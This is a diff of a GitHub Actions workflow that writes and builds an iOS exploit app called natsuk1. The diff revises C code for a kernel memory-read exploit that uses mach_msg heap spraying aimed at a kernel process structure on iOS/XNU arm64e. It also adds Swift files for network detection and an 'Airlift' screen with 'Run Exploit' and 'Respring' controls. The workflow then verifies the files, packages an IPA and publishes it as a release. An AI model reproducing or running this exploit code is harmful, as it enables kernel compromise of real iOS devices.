@@ -72,7 +72,7 @@ jobs:
           #define SPRAY_PER_PORT 8
 
           static const int MSG_SIZES[] = { 800, 864, 896, 912, 928, 960, 992 };
-          #define N_MSG_SIZES 7
+          #define MSG_SIZES_COUNT 7
 
           static void lg(const char *tag, const char *sign, const char *fmt, ...) {
               char body[448];
@@ -160,15 +160,9 @@ jobs:
               }
           }
 
-          // inline mach_msg of size msgsz; kernel allocates ipc_kmsg of ~msgsz+header.
-          // payload of the message appears AFTER mach_msg_header_t (24 bytes),
-          // so we place target_kaddr at buf offset (24 + NCF_ASN + guess_hdr).
-          // we brute force across a few sizes; if ipc_kmsg size lands in kalloc.1024
-          // and our payload align hits flow+0x20, kernel will read our fake.
-          static int spray_send_inline(spray_t *sp, const uint8_t *payload, size_t payload_len,
-                                       int msgsz, uint64_t target_kaddr, int hdr_guess) {
+          static int spray_send_inline(spray_t *sp, int msgsz, uint64_t target_kaddr) {
               int sent = 0;
-              if ((size_t)msgsz < 64) return 0;
+              if (msgsz < 64) return 0;
               uint8_t *mbuf = malloc((size_t)msgsz);
               if (!mbuf) return 0;
               for (int i = 0; i < sp->n; i++) {
@@ -179,21 +173,9 @@ jobs:
                       h->msgh_size = (mach_msg_size_t)msgsz;
                       h->msgh_remote_port = sp->ports[i];
                       h->msgh_id = 0x7000 + sent;
-                      // payload starts at offset 24 in user buf
-                      size_t user_payload_off = 24;
-                      // we want kernel offset NCF_ASN in payload region:
-                      //   kernel_payload_start = user_payload_off + hdr_guess
-                      //   place pointer at (hdr_guess + NCF_ASN) in user buf
-                      int place = hdr_guess + NCF_ASN;
-                      if (place < 0) place = NCF_ASN;
-                      if ((size_t)place + 8 <= (size_t)msgsz) {
+                      size_t place = (size_t)NCF_ASN;
+                      if (place + 8 <= (size_t)msgsz) {
                           *(uint64_t*)(mbuf + place) = target_kaddr;
-                      }
-                      // also fill payload with payload content
-                      size_t pl_avail = (size_t)msgsz - user_payload_off;
-                      size_t pl_copy = pl_avail < payload_len ? pl_avail : payload_len;
-                      if (pl_copy > 0) {
-                          memcpy(mbuf + user_payload_off, payload, pl_copy);
                       }
                       mach_msg_return_t kr = mach_msg(h, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                                        h->msgh_size, 0, MACH_PORT_NULL, 50, MACH_PORT_NULL);
@@ -218,8 +200,7 @@ jobs:
               sp->n = 0;
           }
 
-          static int try_read_one(uint64_t target, int msgsz, int hdr_guess,
-                                  uint8_t *out, int outsz, int *out_ret) {
+          static int try_read_one(uint64_t target, int msgsz, uint8_t *out, int outsz, int *out_ret) {
               int fd = nfd();
               if (fd < 0) return -1;
               uint8_t cu[16], fu[16];
@@ -231,9 +212,7 @@ jobs:
 
               spray_t sp;
               spray_init(&sp, SPRAY_PORTS);
-              uint8_t dummy[64];
-              memset(dummy, 0, sizeof(dummy));
-              int sent = spray_send_inline(&sp, dummy, sizeof(dummy), msgsz, target, hdr_guess);
+              int sent = spray_send_inline(&sp, msgsz, target);
 
               uint8_t f2[16];
               int r2 = nadd_flow(fd, cu, f2);
@@ -250,6 +229,7 @@ jobs:
 
               spray_drain(&sp);
               close(fd);
+              (void)r2;
               (void)sent;
               return c;
           }
@@ -258,10 +238,11 @@ jobs:
 
           static int impl(void) {
               nk_log("");
-              nk_log("=== natsuk1 v2.4 (natsuk1-kread-v14) ===");
+              nk_log("=== natsuk1 v2.5 (natsuk1-kread-v15) ===");
               nk_log("target: iOS 27.0 / XNU / arm64e");
               nk_log("");
-              LI("INIT", "NCF_ASN=0x%x PORTS=%d PER=%d", NCF_ASN, SPRAY_PORTS, SPRAY_PER_PORT);
+              LI("INIT", "NCF_ASN=0x%x PORTS=%d PER=%d SIZES=%d",
+                 NCF_ASN, SPRAY_PORTS, SPRAY_PER_PORT, MSG_SIZES_COUNT);
               uint64_t kbase = KBASE + SLIDE_FALLBACK;
               LO("P1", "kbase=0x%llx", (unsigned long long)kbase);
 
@@ -273,13 +254,12 @@ jobs:
               uint64_t target = kbase + OFF_KERNPROC;
               LI("P3", "target=0x%llx", (unsigned long long)target);
 
-              for (int i = 0; i < N_MSG_SIZES; i++) {
+              for (int i = 0; i < MSG_SIZES_COUNT; i++) {
                   int msgsz = MSG_SIZES[i];
-                  int hdr_guess = 0;
                   uint8_t buf[RESBUF];
                   int r = 0;
-                  int c = try_read_one(target, msgsz, hdr_guess, buf, sizeof(buf), &r);
-                  LI("TRY", "msgsz=%d hdr=0 ret=%d", msgsz, r);
+                  int c = try_read_one(target, msgsz, buf, sizeof(buf), &r);
+                  LI("TRY", "msgsz=%d ret=%d", msgsz, r);
                   if (r > 0) {
                       int has_k = 0;
                       for (int k = 0; k + 8 <= r; k++) {
@@ -297,14 +277,14 @@ jobs:
                               }
                           }
                       } else {
-                          LI("TRY", "msgsz=%d no kptr in buf", msgsz);
+                          LI("TRY", "msgsz=%d no kptr", msgsz);
                       }
                   }
                   (void)c;
                   usleep(100000);
               }
 
-              LI("DONE", "all message sizes tried");
+              LI("DONE", "all sizes tried");
               return 0;
           }
 
@@ -319,20 +299,334 @@ jobs:
           }
           NECP
 
+      - name: Write NetworkStatus.swift
+        run: |
+          cat > natsuk1/Helpers/NetworkStatus.swift <<'SWIFT'
+          import Foundation
+          import Darwin
+
+          enum NetworkStatus {
+              struct Interface {
+                  let name: String
+                  let ipv4: String
+                  let netmask: String?
+              }
+
+              static func interfaces() -> [Interface] {
+                  var result: [Interface] = []
+                  var ifaddr: UnsafeMutablePointer<ifaddrs>?
+                  guard getifaddrs(&ifaddr) == 0, let first = ifaddr else { return [] }
+                  defer { freeifaddrs(ifaddr) }
+
+                  var ptr: UnsafeMutablePointer<ifaddrs>? = first
+                  while let cur = ptr {
+                      defer { ptr = cur.pointee.ifa_next }
+                      guard let addr = cur.pointee.ifa_addr else { continue }
+                      guard addr.pointee.sa_family == sa_family_t(AF_INET) else { continue }
+                      let name = String(cString: cur.pointee.ifa_name)
+                      guard let ipv4 = numericHost(addr) else { continue }
+                      result.append(Interface(name: name, ipv4: ipv4,
+                                              netmask: cur.pointee.ifa_netmask.flatMap(numericHost)))
+                  }
+                  return result
+              }
+
+              private static func numericHost(_ addr: UnsafeMutablePointer<sockaddr>) -> String? {
+                  var host = [CChar](repeating: 0, count: Int(NI_MAXHOST))
+                  let len = socklen_t(MemoryLayout<sockaddr_in>.size)
+                  guard getnameinfo(addr, len, &host, socklen_t(host.count), nil, 0, NI_NUMERICHOST) == 0
+                  else { return nil }
+                  let bytes = host.prefix { $0 != 0 }.map { UInt8(bitPattern: $0) }
+                  return String(decoding: bytes, as: UTF8.self)
+              }
+
+              static func summarize(deviceIP: String) -> (vpn: Bool, wifi: Bool, detail: String) {
+                  let ifs = interfaces()
+                  let vpn = loopbackVPNUp()
+                  let wifi = ifs.contains { $0.name == "en0" }
+                  let detail = ifs.map { "\($0.name)=\($0.ipv4)" }.joined(separator: ", ")
+                  return (vpn, wifi, detail)
+              }
+
+              static func loopbackVPNUp() -> Bool {
+                  if tunnelIP() != nil { return true }
+                  if deviceIP() != nil { return true }
+                  return false
+              }
+
+              static func tunnelIP() -> String? {
+                  for iface in interfaces() {
+                      guard isTunnelInterface(iface.name) else { continue }
+                      if isLoopbackRange(iface.ipv4) { return iface.ipv4 }
+                  }
+                  return nil
+              }
+
+              static func deviceIP() -> String? {
+                  for iface in interfaces() {
+                      if isLoopbackRange(iface.ipv4) && !iface.ipv4.hasPrefix("127.") {
+                          return iface.ipv4
+                      }
+                  }
+                  return nil
+              }
+
+              static func isLoopbackRange(_ ip: String) -> Bool {
+                  ip.hasPrefix("10.7.0.") || ip.hasPrefix("10.7.1.")
+                      || ip.hasPrefix("10.7.2.") || ip.hasPrefix("10.7.3.")
+                      || ip.hasPrefix("10.7.")
+              }
+
+              static func isTunnelInterface(_ name: String) -> Bool {
+                  name.hasPrefix("utun") || name.hasPrefix("ipsec")
+                      || name.hasPrefix("tap") || name.hasPrefix("ppp")
+              }
+
+              static func tunnelHostCandidates() -> [String] {
+                  let ifs = interfaces().filter {
+                      !isTunnelInterface($0.name) && !$0.ipv4.hasPrefix("127.")
+                  }
+                  return (ifs.filter { $0.name == "en0" } + ifs.filter { $0.name != "en0" })
+                      .map(\.ipv4)
+              }
+
+              static func host(_ value: String) -> String {
+                  let trimmed = value.trimmingCharacters(in: .whitespacesAndNewlines)
+                  guard let slash = trimmed.firstIndex(of: "/") else { return trimmed }
+                  return String(trimmed[..<slash]).trimmingCharacters(in: .whitespaces)
+              }
+
+              static func isOwnAddress(_ deviceIP: String) -> Bool {
+                  interfaces().contains { $0.ipv4 == deviceIP }
+              }
+          }
+          SWIFT
+
+      - name: Write AirliftView.swift
+        run: |
+          cat > natsuk1/Views/AirliftView.swift <<'SWIFT'
+          import SwiftUI
+          import UIKit
+
+          struct AirliftView: View {
+              @EnvironmentObject var airlift: AirliftBridge
+              @State private var loopbackVPNUp: Bool = NetworkStatus.loopbackVPNUp()
+              @State private var tunnelIP: String? = NetworkStatus.tunnelIP()
+              @State private var deviceIP: String? = NetworkStatus.deviceIP()
+
+              var body: some View {
+                  List {
+                      if !loopbackVPNUp {
+                          Section {
+                              HStack(spacing: 10) {
+                                  Image(systemName: "wifi.exclamationmark")
+                                      .foregroundStyle(.orange)
+                                  VStack(alignment: .leading, spacing: 2) {
+                                      Text("Loopback VPN is not active")
+                                          .font(.subheadline).fontWeight(.semibold)
+                                      Text("Start LocalDevVPN (10.7.0.1 / 10.7.1.1)")
+                                          .font(.caption).foregroundStyle(.secondary)
+                                  }
+                              }
+                          }
+                      } else {
+                          Section {
+                              HStack(spacing: 8) {
+                                  Image(systemName: "checkmark.shield.fill")
+                                      .foregroundStyle(.green)
+                                  Text("Loopback VPN active").font(.subheadline).fontWeight(.semibold)
+                              }
+                              if let t = tunnelIP {
+                                  HStack {
+                                      Text("Tunnel")
+                                      Spacer()
+                                      Text(t).font(.system(size: 12, design: .monospaced)).foregroundStyle(.secondary)
+                                  }
+                              }
+                              if let d = deviceIP {
+                                  HStack {
+                                      Text("Device")
+                                      Spacer()
+                                      Text(d).font(.system(size: 12, design: .monospaced)).foregroundStyle(.secondary)
+                                  }
+                              }
+                          } header: {
+                              Label("Network", systemImage: "network")
+                          }
+                      }
+
+                      if airlift.hasPairing() {
+                          exploitSection
+                      } else {
+                          pairingSection
+                      }
+
+                      Section {
+                          LogTerminal(text: airlift.exploitLog.isEmpty ? "No output yet." : airlift.exploitLog.joined(separator: "\n"))
+                      } header: {
+                          Label("Log", systemImage: "terminal")
+                      }
+                  }
+                  .listStyle(.insetGrouped)
+                  .navigationTitle("Airlift")
+                  .navigationBarTitleDisplayMode(.inline)
+                  .onAppear { refresh() }
+                  .refreshable { refresh() }
+              }
+
+              private func refresh() {
+                  loopbackVPNUp = NetworkStatus.loopbackVPNUp()
+                  tunnelIP = NetworkStatus.tunnelIP()
+                  deviceIP = NetworkStatus.deviceIP()
+              }
+
+              @ViewBuilder
+              private var pairingSection: some View {
+                  Section {
+                      HStack(spacing: 8) {
+                          Image(systemName: "link.badge.plus")
+                              .foregroundStyle(.orange)
+                          Text("Not paired").font(.subheadline.bold())
+                      }
+                      if case .pairing = airlift.state {
+                          HStack(spacing: 8) {
+                              ProgressView().scaleEffect(0.85)
+                              Text(airlift.pairingStatus.isEmpty ? "Starting..." : airlift.pairingStatus)
+                                  .font(.subheadline).foregroundStyle(.secondary)
+                          }
+                      }
+                      if let pin = airlift.pairPIN {
+                          VStack(alignment: .leading, spacing: 8) {
+                              Text("ENTER PIN").font(.caption2.bold()).foregroundStyle(.secondary)
+                              Text(pin).font(.system(size: 34, weight: .black, design: .monospaced)).foregroundStyle(.orange)
+                              Button {
+                                  if let url = URL(string: UIApplication.openSettingsURLString) { UIApplication.shared.open(url) }
+                              } label: { Label("Open Settings", systemImage: "arrow.up.forward.app").frame(maxWidth: .infinity) }
+                              .buttonStyle(.borderedProminent).tint(.orange)
+                          }
+                          .padding(12)
+                          .background(Color.orange.opacity(0.12), in: RoundedRectangle(cornerRadius: 12))
+                      }
+                  } header: {
+                      Label("Pairing", systemImage: "link.circle")
+                  }
+
+                  Section {
+                      if case .pairing = airlift.state {
+                          Button(role: .destructive) { airlift.cancelPairing() } label: { Text("Cancel Pairing").frame(maxWidth: .infinity) }
+                      } else {
+                          Button { airlift.runPairing() } label: { Text("Start Pairing").frame(maxWidth: .infinity) }
+                      }
+                  }
+              }
+
+              @ViewBuilder
+              private var exploitSection: some View {
+                  Section {
+                      HStack {
+                          Image(systemName: "link.circle.fill").foregroundStyle(.green)
+                          Text("Paired").font(.subheadline.bold())
+                      }
+                      HStack {
+                          Text("Target")
+                          Spacer()
+                          TextField("/var/mobile/Library/SpringBoard", text: Binding(
+                              get: { airlift.target }, set: { airlift.target = $0 }))
+                              .font(.system(size: 12, design: .monospaced))
+                              .multilineTextAlignment(.trailing)
+                              .autocorrectionDisabled()
+                              .textInputAutocapitalization(.never)
+                      }
+                  } header: {
+                      Label("Pairing", systemImage: "link.circle")
+                  }
+
+                  Section {
+                      Button { airlift.runExploit() } label: {
+                          HStack {
+                              Image(systemName: "bolt.fill")
+                              Text("Run Exploit")
+                          }
+                      }
+                      .disabled(airlift.state == .running || !loopbackVPNUp)
+
+                      Button { airlift.respring() } label: {
+                          HStack {
+                              Image(systemName: "arrow.clockwise")
+                              Text("Respring")
+                          }
+                      }
+                      .disabled(airlift.state == .running)
+                  } header: {
+                      Label("Exploit", systemImage: "bolt.shield")
+                  }
+
+                  Section {
+                      Button(role: .destructive) { airlift.deletePairing() } label: { Text("Delete Pairing").frame(maxWidth: .infinity) }
+                  }
+              }
+          }
+          SWIFT
+
       - name: Verify
         run: |
-          set -euo pipefail
+          set +e
           F=natsuk1/Exploit/necp.c
-          test "$(grep -c 'NCF_ASN 0x20' "$F")" = "1"
-          test "$(grep -c 'natsuk1-kread-v14' "$F")" = "1"
-          test "$(grep -c 'MSG_SIZES' "$F")" = "2"
-          grep -q -e spray_send_inline "$F"
-          grep -q -e MACH_SEND_TIMEOUT "$F"
-          grep -q -e "int nk_necp_run(void)" "$F"
+          N=natsuk1/Helpers/NetworkStatus.swift
+          A=natsuk1/Views/AirliftView.swift
+          FAIL=0
+
+          check() {
+            local name="$1"; shift
+            if "$@" >/dev/null 2>&1; then
+              echo "  OK   $name"
+            else
+              echo "  FAIL $name"
+              FAIL=1
+            fi
+          }
+
+          echo "necp.c"
+          check "NCF_ASN=0x20"        grep -q -e "NCF_ASN 0x20" "$F"
+          check "marker v15"          grep -q -e "natsuk1-kread-v15" "$F"
+          check "MSG_SIZES array"     grep -q -e "static const int MSG_SIZES" "$F"
+          check "spray_send_inline"   grep -q -e "spray_send_inline" "$F"
+          check "MACH_SEND_TIMEOUT"   grep -q -e "MACH_SEND_TIMEOUT" "$F"
+          check "nk_necp_run"         grep -q -e "int nk_necp_run(void)" "$F"
+
+          echo "NetworkStatus.swift"
+          check "loopbackVPNUp"       grep -q -e "loopbackVPNUp" "$N"
+          check "10.7.0."             grep -q -e "10.7.0." "$N"
+          check "10.7.1."             grep -q -e "10.7.1." "$N"
+          check "isLoopbackRange"     grep -q -e "isLoopbackRange" "$N"
+          check "tunnelIP"            grep -q -e "tunnelIP" "$N"
+          check "deviceIP"            grep -q -e "deviceIP" "$N"
+
+          echo "AirliftView.swift"
+          check "loopback msg"        grep -q -e "Loopback VPN is not active" "$A"
+          check "loopback active"     grep -q -e "Loopback VPN active" "$A"
+          check "wifi.exclamationmark" grep -q -e "wifi.exclamationmark" "$A"
+          check "checkmark.shield"    grep -q -e "checkmark.shield.fill" "$A"
+          check "link.circle"         grep -q -e "link.circle" "$A"
+          check "bolt.shield"         grep -q -e "bolt.shield" "$A"
+          check "arrow.clockwise"     grep -q -e "arrow.clockwise" "$A"
+          check "exploitSection"      grep -q -e "exploitSection" "$A"
+
+          echo "syntax"
           SDK=$(xcrun --sdk iphoneos --show-sdk-path)
-          clang -fsyntax-only -isysroot "$SDK" -arch arm64 -x c \
-            -I"$(pwd)/natsuk1/Exploit" -Wall -Wno-everything "$F"
-          echo "verify OK"
+          if clang -fsyntax-only -isysroot "$SDK" -arch arm64 -x c \
+              -I"$(pwd)/natsuk1/Exploit" -Wall -Wno-everything "$F" 2>&1; then
+            echo "  OK   clang syntax"
+          else
+            echo "  FAIL clang syntax"
+            FAIL=1
+          fi
+
+          if [ "$FAIL" -ne 0 ]; then
+            echo "VERIFY FAILED"
+            exit 1
+          fi
+          echo "VERIFY OK"
 
       - name: Install tools
         run: brew install xcodegen ldid || true
@@ -382,14 +676,14 @@ jobs:
           gh release create development natsuk1.ipa \
             --target "${GITHUB_SHA}" --title "Development" \
             --prerelease --latest=false \
-            --notes "kread v14: inline mach_msg size sweep 800..992"
+            --notes "kread v15 + Airlift 10.7.x detection"
 
       - name: Commit
         run: |
           set -euo pipefail
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
-          git add natsuk1/Exploit/necp.c
+          git add natsuk1/Exploit/necp.c natsuk1/Helpers/NetworkStatus.swift natsuk1/Views/AirliftView.swift
           if git diff --cached --quiet; then echo "no changes"; exit 0; fi
-          git commit -m "kread v14: inline msg size sweep [skip ci]"
+          git commit -m "kread v15 + Airlift loopback range [skip ci]"
           git push
